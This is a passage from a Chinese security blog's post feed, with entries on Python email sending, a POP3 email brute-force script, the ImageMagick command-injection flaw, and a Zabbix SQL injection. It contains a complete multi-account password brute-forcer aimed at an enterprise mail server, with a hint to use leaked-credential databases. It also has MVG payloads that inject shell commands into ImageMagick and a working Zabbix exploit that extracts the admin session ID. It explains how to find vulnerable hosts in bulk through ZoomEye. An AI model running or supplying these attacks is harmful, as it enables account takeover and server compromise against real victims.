<p>发送邮件部分主要用了<code>smtplib和email</code>库，具体代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">to_list=[&apos;xxx@qq.com&apos;] 			#接收通知的邮箱</div><div class="line">mail_host = &apos;smtp.163.com&apos; 		#设置服务器</div><div class="line">mail_user = &apos;xxx&apos; 				#替换为发件邮箱用户名,不带@后面的</div><div class="line">mail_pass = &apos;xxx&apos;  				#替换为发件邮箱口令</div><div class="line">mail_postfix = &apos;163.com&apos;  		#发件箱的后缀</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;)</div></pre></td></tr></table></figure>
<p>第一个参数就是邮件正文，第二个参数是MIME的subtype，传入’plain’，最终的MIME就是’text/plain’，最后设置编码为gb2312，不过为了兼容性，你可以使用<code>utf-8</code>，具体的过程函数我就不解释了。</p>
<p>信息抓取部分，很简单就是把数据变为数组，从数组中匹配信息。这里我遇到一个问题：<code>urllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)&gt;</code><br>这个错误信息主要是因为：<code>SSL: CERTIFICATE_VERIFY_FAILED</code>Python 升级到 2.7.9 之后引入了一个新特性，当使用urllib.urlopen打开一个 https 链接时，会验证一次 SSL 证书。而当目标网站使用的是自签名的证书时就会抛出一个 urllib2.URLError: 的错误消息.</p>
<p><strong>解决方案：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import ssl</div><div class="line">import urllib2</div><div class="line">ssl._create_default_https_context = ssl._create_unverified_context</div><div class="line">print urllib2.urlopen(&quot;https://www.111cn.net/&quot;).read()</div></pre></td></tr></table></figure></p>
<p><strong>附：</strong></p>
<p><strong>smtp协议的基本命令包括：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HELO 向服务器标识用户身份</div><div class="line">MAIL 初始化邮件传输 mail from:</div><div class="line">RCPT 标识单个的邮件接收人；常在MAIL命令后面,可有多个rcpt  to:</div><div class="line">DATA 在单个或多个RCPT命令后,表示所有的邮件接收人已标识,并初始化数据传输,以.结束</div><div class="line">VRFY 用于验证指定的用户/邮箱是否存在；由于安全方面的原因,服务器常禁止此命令</div><div class="line">EXPN 验证给定的邮箱列表是否存在,扩充邮箱列表,也常被禁用</div><div class="line">HELP 查询服务器支持什么命令</div><div class="line">NOOP 无操作,服务器应响应OK</div><div class="line">QUIT 结束会话</div><div class="line">RSET 重置会话,当前传输被取消</div><div class="line">MAIL FROM 指定发送者地址</div><div class="line">RCPT TO 指明的接收者地址</div></pre></td></tr></table></figure></p>
<p><strong>SMTP会话的流程：</strong></p>
<ol>
<li>ehlo</li>
<li>auth login</li>
<li>mail from</li>
<li>rcpt to</li>
<li>data</li>
<li>quit</li>
</ol>
<p>上面说的是最普通的情况，但是现在好多企业邮件都是安全邮件的，就是通过SSL发送的邮件，这个怎么发呢？SMTP对SSL安全邮件的支持有两种方案，一种老的是专门开启一个465端口来接收ssl邮件，另一种更新的做法是在标准的25端口的smtp上增加一个<code>starttls</code>的命令来支持。</p>
<p>这个很简单，<code>smtplib</code>里就有这个方法，叫<code>smtplib.starttls()</code>。当然，不是所有的邮件系统都支持安全邮件的，这个需要从<code>ehlo</code>的返回值里来确认，如果里面有<code>starttls</code>，才表示支持。</p>
<p><strong>注意：</strong><br>以上的代码为了方便我都没有判断返回值，严格说来，是应该判断一下返回的代码的，在smtp协议中，只有返回代码是2xx或者3xx才能继续下一步，返回4xx或5xx的，都是出错了。</p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python 邮箱爆破]]></title>
      <url>/2016/10/03/Python-%E9%82%AE%E7%AE%B1%E7%88%86%E7%A0%B4/</url>
      <content type="html"><![CDATA[<p>按照师傅给的任务，写了一个企业邮箱的爆破脚本，后续还有FTP,SSH等一些爆破的脚本。</p>
<p>我先说下整体思路：</p>
<p>总体就是利用python的poplib模块来从pop3服务器上交互，根据获取的相关信息，产生结果。POP3协议并不复杂，它也是采用的一问一答式的方式，你向服务器发送一个命令，服务器必然会回复一个信息.<br><a id="more"></a></p>
<ol>
<li>首先验证参数是否正确<br>Sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始</li>
<li>然后从用户密码文件中读取信息</li>
<li>pop.getwelcome()用来获取连接服务器的响应状态</li>
<li><p>然后就是脚本的核心代码部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">server = &quot;pop.qiye.163.com&quot; 	//设置pop3服务器地址</div><div class="line">pop = poplib.POP3(server,110) 	//连接pop3服务器</div><div class="line">pop.user(user) 			//验证用户名</div><div class="line">auth = pop.pass_(passwd) 	//验证密码</div><div class="line">if auth.split(&apos; &apos;)[0]== &quot;+OK&quot;: 	//判断响应的结果是否“OK”</div><div class="line">    pring user,passwd</div></pre></td></tr></table></figure>
</li>
<li><p>最后输出出来相关的用户信息</p>
</li>
</ol>
<p>脚本代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@博客：http://byd.dropsec.xyz/</div><div class="line">@Email Pop3 Brute Forcer</div><div class="line">&apos;&apos;&apos;</div><div class="line"></div><div class="line">import threading, time, random, sys, poplib</div><div class="line">from copy import copy</div><div class="line"></div><div class="line">if len(sys.argv) !=3:</div><div class="line">  print &quot;\t   --------------------------------------------------\n&quot;</div><div class="line">  print &quot;\t    Usage: ./Emailpopbrute.py &lt;userlist&gt; &lt;passlist&gt;\n&quot;</div><div class="line">  sys.exit(1)</div><div class="line"></div><div class="line">server = &quot;pop.qiye.163.com&quot;</div><div class="line">success = []</div><div class="line"></div><div class="line">try:</div><div class="line">    users = open(sys.argv[1], &quot;r&quot;).readlines()</div><div class="line">except(IOError):</div><div class="line">    print &quot;[-] Error: urerlist打开失败!\n&quot;</div><div class="line">    sys.exit(1)</div><div class="line"></div><div class="line">try:</div><div class="line">    words = open(sys.argv[2], &quot;r&quot;).readlines()</div><div class="line">except(IOError):</div><div class="line">    print &quot;[-] Error: passlist打开失败!\n&quot;</div><div class="line">    sys.exit(1)</div><div class="line">try:</div><div class="line">  pop = poplib.POP3(server,110)</div><div class="line">  welcome = pop.getwelcome()</div><div class="line">  print welcome</div><div class="line">  pop.quit()</div><div class="line">except (poplib.error_proto):</div><div class="line">  welcome = &quot;No Response&quot;</div><div class="line">  pass</div><div class="line"></div><div class="line">def mailbruteforce(listuser,listpwd):</div><div class="line">  if len(listuser) &lt; 1 or len(listpwd) &lt; 1 :</div><div class="line">    print &quot;An error occurred: No user or pass list&quot;</div><div class="line">    return 1</div><div class="line">  for user in listuser:</div><div class="line">    for value in listpwd :</div><div class="line">      user = user.replace(&quot;\n&quot;,&quot;&quot;)</div><div class="line">      value = value.replace(&quot;\n&quot;,&quot;&quot;)</div><div class="line">      try:</div><div class="line">        print &quot;-&quot;*12</div><div class="line">        print &quot;[+] User:&quot;,user,&quot;Password:&quot;,value</div><div class="line">        time.sleep(1)</div><div class="line">        pop = poplib.POP3(server,110)</div><div class="line">        pop.user(user)</div><div class="line">        auth = pop.pass_(value)</div><div class="line">        print auth</div><div class="line">        if auth.split(&apos; &apos;)[0]!= &quot;+OK&quot; :</div><div class="line">          pop.quit()</div><div class="line">          print &quot;unknown error !&quot;</div><div class="line">          continue</div><div class="line">        if pop.stat()[1] is None or pop.stat()[1] &lt; 1 :</div><div class="line">          pop.quit()</div><div class="line">          print &quot;获取信息失败!&quot;</div><div class="line">          continue</div><div class="line">        ret = (user,value,pop.stat()[0],pop.stat()[1])</div><div class="line">        success.append(ret)</div><div class="line">        pop.quit()</div><div class="line">        break</div><div class="line">      except:</div><div class="line">        #print &quot;An error occurred:&quot;, msg</div><div class="line">        pass</div><div class="line">print &quot;\t   --------------------------------------------------\n&quot;</div><div class="line">print &quot;[+] Server:&quot;,server</div><div class="line">print &quot;[+] Port: 995&quot;</div><div class="line">print &quot;[+] Users Loaded:&quot;,len(users)</div><div class="line">print &quot;[+] Words Loaded:&quot;,len(words)</div><div class="line">print &quot;[+] Server response:&quot;,welcome,&quot;\n&quot;</div><div class="line">mailbruteforce(users,words)</div><div class="line"></div><div class="line">print &quot;\t[+] have weakpass :\t&quot;,len(success)</div><div class="line">if len(success) &gt;=1:</div><div class="line">  for ret in success:</div><div class="line">    print &quot;\n\n[+] Login successful:&quot;,ret[0], ret[1]</div><div class="line">    print &quot;\t[+] Mail:&quot;,ret[2],&quot;emails&quot;</div><div class="line">    print &quot;\t[+] Size:&quot;,ret[3],&quot;bytes\n&quot;</div><div class="line">print &quot;\n[-] Done&quot;</div></pre></td></tr></table></figure>
<p>测试结果：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/163.png" alt=""></p>
<p><strong>说明：</strong><br>用户字典文件需要@domain.com，类似zhangsan@domain.com、lisi@domain.com、wangwu@domain.com这样的。由于我也没有企业邮箱的账号密码，也就没测试成功的，要是感兴趣，可以搜一下相关社工裤。</p>
<p><strong>附：</strong></p>
<p><strong>python 中 os._exit()， sys.exit()， exit() 的区别是什么？</strong></p>
<ol>
<li>sys.exit(n) 退出程序引发一个SystemExit异常, 可以捕获异常执行些清理工作. n默认值为0, 表示正常退出. 其他都是非正常退出. 没有捕获这个异常，会直接退出；捕获这个异常可以做一些额外的清理工作。 一般主程序中使用此退出</li>
<li>os._exit(n), 直接退出 Python 解释器，其后的代码都不执行, 不抛异常, 不执行相关清理工作. 常用在子进程的退出.</li>
<li>exit() 跟 C 语言等其他语言的 exit() 应该是一样的</li>
</ol>
<p><strong>pop3收取邮件的过程一般是:</strong></p>
<ol>
<li>连接pop3服务器 (poplib.POP3.__init__)</li>
<li>发送用户名和密码进行验证 (poplib.POP3.user poplib.POP3.pass_)</li>
<li>获取邮箱中信件信息 (poplib.POP3.stat)</li>
<li>收取邮件 (poplib.POP3.retr)</li>
<li>删除邮件 (poplib.POP3.dele)</li>
<li>退出 (poplib.POP3.quit)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">命令　poplib方法　　　　参数　　　  状态　　　　　描述</div><div class="line">-----------------------------------------------------------------------------------------------</div><div class="line">USER　　user  　  username　　认可　　用户名，此命令与下面的pass命令若成功，将导致状态转换</div><div class="line">PASS　　pass_ 　　password　　认可　　用户密码　　　</div><div class="line">APOP　　apop　　　Name,Digest 认可　  Digest是MD5消息摘要</div><div class="line">-----------------------------------------------------------------------------------------------</div><div class="line">STAT　　stat  　　None　　　  处理　　请求服务器发回关于邮箱的统计资料，如邮件总数和总字节数</div><div class="line">UIDL　　uidl　　　[Msg#]　　  处理　　返回邮件的唯一标识符，POP3会话的每个标识符都将是唯一的</div><div class="line">LIST　　list　　　[Msg#]　　  处理　　返回邮件数量和每个邮件的大小</div><div class="line">RETR　　retr　　　[Msg#]　    处理　　返回由参数标识的邮件的全部文本</div><div class="line">DELE　　dele　　　[Msg#]　    处理　　服务器将由参数标识的邮件标记为删除，由quit命令执行</div><div class="line">RSET　　rset　　　None　　    处理　  服务器将重置所有标记为删除的邮件，用于撤消DELE命令</div><div class="line">TOP　　 top  　　 [Msg#]　　  处理　  服务器将返回由参数标识的邮件前n行内容，n必须是正整数</div><div class="line">NOOP　　noop　　　None　　　　处理　　服务器返回一个肯定的响应</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 编程 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ImageMagick命令执行漏洞浅析]]></title>
      <url>/2016/10/02/ImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
      <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h2 id="什么是ImageMagick？"><a href="#什么是ImageMagick？" class="headerlink" title="什么是ImageMagick？"></a>什么是ImageMagick？</h2><p>ImageMagick是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的JPEG、GIF、 PNG、PDF以及PhotoCD等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。<br><a id="more"></a><br>由于其功能强大、性能较好,并且对很多语言都有拓展支持,所以在程序开发中被广泛使用。许多网站开发者喜爱使用ImageMagick拓展来做web上的图片处理工作,比如用户头像生成、图片编辑等。</p>
<h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。当攻击者构造含有恶意代码得图片时，ImageMagick库对于HTTPPS文件处理不当，没有做任何过滤，可远程实现远程命令执行，进而可能控制服务器。</p>
<h1 id="0x02-影响程度"><a href="#0x02-影响程度" class="headerlink" title="0x02 影响程度"></a>0x02 影响程度</h1><p>攻击成本：低</p>
<p>危害程度：高</p>
<p>影响范围：ImageMagick 6.9.3-9以前的所有版本</p>
<h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。</p>
<p>ImageMagick之所以支持那么多的文件格式,是因为它内置了非常多的图像处理库,对于这些图像处理库,ImageMagick给它起了个名字叫做”Delegate”(委托),每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。</p>
<p>ImageMagick委托的默认配置文件： <code>/etc/ImageMagick/delegates.xml</code></p>
<p>具体代码请参考：<a href="https://github.com/ImageMagick/ImageMagick/blob/25d021ff1a60a67680dbb640ccc0b6b60f785192/magick/delegate.c" target="_blank" rel="external">Github-ImageMagick</a></p>
<p>我们定位到https委托得那一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;  &lt;delegate decode=\&quot;https\&quot; command=\&quot;&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\&quot;/&gt;&quot;</div></pre></td></tr></table></figure></p>
<p>可以看到，command定义了它对于https文件处理时带入system()函数得命令：<code>&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;。</code></p>
<p><code>wget</code>是从网络下载文件得命令，<code>%M</code>是一个占位符，它得具体定义在配置文件中如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">%i  input image filename</div><div class="line">    %o  output image filename</div><div class="line">    %u  unique temporary filename</div><div class="line">    %Z  unique temporary filename</div><div class="line">    %#  input image signature</div><div class="line">    %b  image file size</div><div class="line">    %c  input image comment</div><div class="line">    %g  image geometry</div><div class="line">    %h  image rows (height)</div><div class="line">    %k  input image number colors</div><div class="line">    %l  image label</div><div class="line">    %m  input image format</div><div class="line">    %p  page number</div><div class="line">    %q  input image depth</div><div class="line">    %s  scene number</div><div class="line">    %w  image columns (width)</div><div class="line">    %x  input image x resolution</div><div class="line">    %y  input image y resolution</div></pre></td></tr></table></figure></p>
<p>可以看到%m被定义为输入的图片格式,也就是我们输入的url地址。但是由于只是做了简单的字符串拼接,没有做任何过滤，直接拼接到command命令中，所以我们可以将引号闭合后通过<code>&quot;|&quot;</code>,”`”,”&amp;”等带入其他命令,也就形成了命令注入。</p>
<p>比如我们传入如下代码：</p>
<blockquote>
<p><a href="https://test.com&quot;|ls" target="_blank" rel="external">https://test.com&quot;|ls</a> “-al</p>
</blockquote>
<p>则实际得system函数执行得命令为：</p>
<blockquote>
<p>“wget” -q -O “%o” “ <a href="https://test.com&quot;|ls" target="_blank" rel="external">https://test.com&quot;|ls</a> “-al”</p>
</blockquote>
<p>这样，ls -al命令成功执行。</p>
<h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><p>这个漏洞得poc由老外给出得，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://&quot;|id; &quot;)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure></p>
<ol>
<li>push和pop是用于堆栈的操作，一个进栈，一个出栈;</li>
<li>viewbox是表示<a href="http://baike.baidu.com/link?url=3qIrRPRNACGRtex1L-crgs6E-wXDYFtIsYDBiw9LFLeL_pJQM5hZrPcMG8KbVrlAb8fT46oY_BGLyHe3hbkqWF8GKJH7OT116rbq6din5W3" target="_blank" rel="external">SVG</a>可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;</li>
<li>fill url()是把图片填充到当前元素内;</li>
</ol>
<p>在其中我们使用了fill url()的形式调用存在漏洞的https delegate,当ImageMagick去处理这个文件时,漏洞就会被触发。</p>
<p><strong>附</strong>：ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，允许在其中加载ImageMagick中其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中,ImageMagick会自动根据其内容进行处理,也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式,这大大增加了漏洞的可利用场景。</p>
<p><strong>利用过程：</strong></p>
<ol>
<li><p>创建一个exploit.png文件，包含以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://test.com/image.jpg&quot;|ls &quot;-al)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
</li>
<li><p>执行命令：<code>convert exploit.png 1.png</code>(后面的是convert的参数)</p>
</li>
</ol>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/imagemagick1.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/imagemagick2.png" alt=""></p>
<h1 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h1><ol>
<li>升级到最新版本</li>
<li>配置<code>/etc/ImageMagick/policy.xml</code>的方式来禁止https、mvg这些delegate,或者直接在配置文件删除相应的delegate</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;policymap&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;</div><div class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;</div><div class="line">&lt;/policymap&gt;</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Zabbix SQL注入,绕过登陆]]></title>
      <url>/2016/09/23/Zabbix-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86/</url>
      <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>Zabbix是一个开源的企业级性能监控解决方案。zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。 但是无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。<br><a id="more"></a></p>
<h1 id="0x01-影响程度"><a href="#0x01-影响程度" class="headerlink" title="0x01 影响程度"></a>0x01 影响程度</h1><p>攻击成本：低</p>
<p>危害程度：高</p>
<p>是否登陆：不需要</p>
<p>影响范围：2.2.x, 3.0.0-3.0.3。（摘自Freebuf）</p>
<h1 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h1><p>在Zabbix中有两个文件存在SQL注入漏洞，分别是<code>jsrpc.php</code>和<code>latest.php</code>，存在漏洞参数分别为：<code>profileIdx2</code>和<code>toggle_ids</code>。</p>
<p>在目标的zabbix的地址后面加上如下POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim</div><div class="line">estamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi</div><div class="line">story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2&apos;666&amp;updateProfil</div><div class="line">e=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=</div><div class="line">17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;</div><div class="line">mark_color=1</div></pre></td></tr></table></figure>
<p>若返回页面出现<code>You have an error in your SQL syntax</code>则证明存在SQL注入漏洞。</p>
<p>漏洞EXP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@博客：http://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import urllib,sys,urllib2,urllib</div><div class="line">def cookie(url):</div><div class="line">    poc=&apos;/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=(select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y)&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=&apos;</div><div class="line">    body= urllib.urlopen(url+poc).read()</div><div class="line">    cookie=body.split(&apos;Duplicate entry&apos;)[1].split(&apos;for key&apos;)[0][3:-2]</div><div class="line">    return cookie</div><div class="line">def test(cookie,url):</div><div class="line">    url=url+&apos;proxies.php&apos;</div><div class="line">    req=urllib2.Request(url)</div><div class="line">    cook=&quot;zbx_sessionid=%s&quot; % cookie</div><div class="line">    req.add_header(&apos;Cookie&apos;, cook)</div><div class="line">    response=urllib2.urlopen(req)</div><div class="line">    data=response.read()</div><div class="line">    if data.find(&apos;Access denied.&apos;) &lt; 0:</div><div class="line">        print &quot;OK--&gt;&quot;,cookie</div><div class="line">    else:</div><div class="line">        print &apos;ERROR&apos;</div><div class="line">if len(sys.argv)==4:</div><div class="line">    for i in open(sys.argv[3]).readlines():</div><div class="line">        print i</div><div class="line">        test(cookie(i),i)</div><div class="line">else:</div><div class="line">    print sys.argv[1]</div><div class="line">    test(cookie(sys.argv[1]),sys.argv[1])</div></pre></td></tr></table></figure></p>
<p><strong>设计步骤</strong>：<br>首先查询的sql语句为：<code>select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y</code></p>
<p>查询的<code>sessionid</code>会在页面中显示</p>
<p>然后通过<code>body.split(&#39;Duplicate entry&#39;)[1].split(&#39;for key&#39;)[0][3:-2]</code>来取出<code>sessionid</code>的值,具体的可以看响应的页面结构</p>
<p>然后带入cookie访问<code>proxies.php</code>，如果没有出现<code>Access denied.</code></p>
<p>则说明进入成功，输出<code>sessionid</code>的值</p>
<p>参考:<a href="http://www.waitalone.cn/zabbix-sql-1.html" target="_blank" rel="external">独自等待博客EXP</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/zabbix_sql1.png" alt=""></p>
<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>1、禁用后台用户guest账号（注入要求此账号启用）。</p>
<p>2、升级到zabbix的最新版。</p>
<h1 id="0x04-批量查找"><a href="#0x04-批量查找" class="headerlink" title="0x04 批量查找"></a>0x04 批量查找</h1><p>上<a href="www.zoomeye.org">Zoomeye</a>，输入查询关键字:<code>Zabbix port:80</code>，当然，如果你想定点查询的话还可以加上<code>country:</code> <code>City:</code>等字段，比如查询北京<code>Zabbix country:china port:80 city:Beijing</code>;</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/Zabbix_sql2.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 自动化 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHPCMS2008广告模板SQL注入漏洞]]></title>
